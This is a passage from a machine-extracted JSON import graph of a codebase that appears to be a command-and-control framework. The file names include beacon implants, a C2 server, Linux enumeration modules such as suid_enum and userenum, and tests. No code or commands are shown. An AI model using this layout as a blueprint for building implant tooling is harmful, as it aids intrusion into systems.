"EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "errno.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "curl/curl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "openssl/bio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "openssl/evp.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "pthread.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/beacon.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "errno.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v1/gopher_beacon.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "pthread.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v2/beacon.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacons/v3/beacon.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/cat/bof.c", "target": "beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/cat/bof.c", "target": "syscalls.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/include/beacon_api.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/include/beacon_api.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/include/beacon_api.h", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/include/syscalls.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/is_sudo/bof.c", "target": "beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/is_sudo/bof.c", "target": "syscalls.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/suid_enum/bof.c", "target": "beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/suid_enum/bof.c", "target": "syscalls.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/userenum/bof.c", "target": "beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/userenum/bof.c", "target": "syscalls.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/whoami/bof.c", "target": "beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof/whoami/bof.c", "target": "syscalls.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "bof.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "base64"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "csv"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "hashlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "hmac"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "json"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "logging"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "socket"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "threading"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "time"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "concurrent.futures"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "typing"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "c2/server.py", "target": "config_py"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "math.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "limits.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "ctype.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "float.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "locale.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "cJSON.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "errno.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_beacon.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "socket"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "threading"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "base64"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "json"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "logging"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "datetime"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "gopher_c2.py", "target": "csv"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes_cfb.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes_cfb.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes_cfb.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/aes_cfb.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon.h", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "curl/curl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "openssl/bio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.c", "target": "openssl/hmac.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.h", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/beacon_common.h", "target": "config.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "math.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "limits.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "ctype.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "float.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "locale.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/cJSON.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "config.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "ctype.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.c", "target": "limits.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config_py.py", "target": "json"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config_py.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config_py.py", "target": "re"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config_py.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "include/config_py.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/config_harness.c", "target": "config.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/config_harness.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/config_harness.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/config_harness.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/crypto_harness.c", "target": "aes_cfb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/crypto_harness.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/crypto_harness.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/crypto_harness.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_beacon_build.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_beacon_build.py", "target": "shutil"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_beacon_build.py", "target": "subprocess"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_beacon_build.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_beacon_build.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_bof_compile.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_bof_compile.py", "target": "re"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_bof_compile.py", "target": "subprocess"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_bof_compile.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_bof_compile.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "base64"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "json"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "socket"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "threading"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "time"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "c2"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_http_e2e.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "base64"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "json"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "shutil"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "time"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_c2_server.py", "target": "c2.server"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "json"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "shutil"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "subprocess"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "tempfile"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_config.py", "target": "shutil"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "subprocess"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "base64"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "cryptography.hazmat.primitives.ciphers"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_crypto.py", "target": "cryptography.hazmat.backends"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_install_deploy.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_install_deploy.py", "target": "shutil"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_install_deploy.py", "target": "stat"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_install_deploy.py", "target": "subprocess"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_install_deploy.py", "target": "sys"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "tests/test_install_deploy.py", "target": "tempfile"}, {"confidence": "EXTRACTED", 